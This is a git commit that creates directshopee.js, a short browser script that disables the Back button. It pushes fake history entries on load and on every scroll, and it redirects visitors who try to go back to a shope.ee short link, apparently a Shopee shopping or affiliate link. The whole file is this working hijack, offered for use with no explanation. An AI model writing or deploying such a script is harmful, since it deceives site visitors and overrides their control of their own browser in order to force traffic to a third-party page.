2f9ff567a75650cfd0535c6a507fc9e039164fa0
mychiara <85479169+mychiara@users.noreply.github.com>
2022-10-22 01:10:24 +0800

    Create directshopee.js

---
+++ directshopee.js
@@ -0,0 +1,9 @@
+//---- disable back ----
+history.pushState(null, document.title, window.location.href);
+window.addEventListener('popstate', function (event)
+{
+  window.location.href="https://shope.ee/6Uhmz5pJ0c";
+});
+window.addEventListener('scroll', function() {
+  history.pushState(null, document.title, window.location.href);
+});
